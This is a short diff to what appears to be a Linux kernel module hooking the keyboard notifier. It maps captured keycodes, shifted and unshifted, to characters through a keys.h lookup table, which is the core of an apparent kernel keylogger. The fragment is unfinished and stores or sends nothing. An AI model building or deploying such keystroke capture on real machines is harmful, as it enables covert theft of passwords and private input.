@@ -2,17 +2,20 @@
 #include <linux/module.h>
 #include <linux/keyboard.h>
 #include <linux/uaccess.h>
+#include <linux/slab.h>
 #include <linux/kernel.h>
 #include <linux/fs.h>
+#include "keys.h"
 static char *msg_Ptr;
 void update_key(struct keyboard_notifier_param p)
 {
     if (p.shift){
         /*hundle as shift*/
+        msg_Ptr = keycode[p.value][1];
     }
     else
     {
-        *msg_Ptr= p.value;
+        msg_Ptr= keycode[p.value][0];
     }
     
 }
